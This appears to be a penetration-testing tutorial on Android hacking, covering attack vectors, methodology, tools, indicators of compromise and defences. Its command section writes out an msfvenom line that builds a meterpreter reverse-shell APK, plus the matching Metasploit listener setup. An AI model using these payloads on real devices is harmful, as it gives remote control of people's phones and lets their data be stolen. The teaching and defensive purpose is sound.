# Android Platform Hacking

## 📌 Introduction
Android Platform Hacking focuses on identifying, exploiting, and mitigating security weaknesses in Android devices, applications, and services.  
Android’s open-source nature, global market share, and diverse ecosystem make it a frequent target for attackers.  

The main goals are:
- Understand Android architecture and security model.
- Discover vulnerabilities in Android apps and OS.
- Exploit misconfigurations, weak permissions, or outdated software.
- Extract sensitive data.
- Perform post-exploitation tasks for persistence and further attacks.

---

## 🎯 Objectives
- Learn Android architecture and security features.
- Perform static and dynamic application analysis.
- Identify insecure coding practices and permissions.
- Exploit OS-level and application-level flaws.
- Maintain persistence after exploitation.
- Document vulnerabilities and remediation steps.

---

## 🔍 Common Attack Vectors
- **Application Vulnerabilities** – Insecure data storage, improper authentication, hardcoded secrets, weak encryption.
- **OS-Level Exploits** – Outdated Android versions, privilege escalation bugs.
- **Network Attacks** – Capturing unencrypted traffic on public Wi-Fi.
- **Physical Access Attacks** – Unlocked bootloaders, bypassing lock screens.
- **Malware Deployment** – Installing malicious APKs to steal data or control devices.

---

## 🛠️ Methodology
1. **Information Gathering**
   - Identify device model, OS version, and installed apps.
2. **Application Analysis**
   - **Static Analysis** – Decompile APKs, review code, analyze permissions.
   - **Dynamic Analysis** – Monitor runtime behavior and API calls.
3. **Vulnerability Scanning**
   - Use tools to detect insecure configurations, outdated libraries, and weak permissions.
4. **Exploitation**
   - Deploy exploits or malicious APK payloads.
5. **Post-Exploitation**
   - Extract credentials, read files, capture screenshots, access sensors.
6. **Reporting**
   - Provide remediation guidelines with proof-of-concepts.

## ⚙️ Common Tools
- **ADB (Android Debug Bridge)** – Device connection, shell access, file transfer.
- **Drozer** – Android security testing framework.
- **MobSF** – Automated mobile security framework for static/dynamic analysis.
- **APKTool** – Decompile/recompile APKs.
- **JD-GUI** – View Java source from compiled APKs.
- **Frida** – Dynamic instrumentation toolkit.
- **Metasploit Framework** – Deploy and manage Android payloads.
- **Wireshark** – Capture and analyze network traffic.

## 📜 Useful Commands
- **List Connected Devices**

      adb devices
  
- **Connect to Device over Network**

      adb connect <IP>:5555

 - **Access Device Shell**

       adb shell
       
 - **Install APK**

       adb install <app.apk>

 - **Pull Files from Device**

       adb pull /sdcard/DCIM/ /local/path/

 - **Generate Android Payload with Metasploit**

       msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 R > payload.apk

 - **Start Listener in Metasploit**

       msfconsole
       use exploit/multi/handler
       set payload android/meterpreter/reverse_tcp
       set LHOST <IP>
       set LPORT 4444
       exploit

## 📊 Indicators of Compromise (IoCs)
- Unknown applications installed.
- Unusual data usage or battery drain.
- Unexpected network connections.
- System settings changed without user action.

---

## 🛡️ Defensive Countermeasures
- Keep OS and apps updated.
- Disable “Install from Unknown Sources”.
- Use app sandboxing and permissions control.
- Deploy MDM (Mobile Device Management) solutions.
- Avoid public Wi-Fi without a VPN.
- Encrypt device storage.

---

## 📄 Reporting
When documenting Android hacking findings:
- Include device details (model, OS version).
- List vulnerabilities found with severity ratings.
- Provide PoCs (screenshots, logs).
- Recommend security patches and configurations.
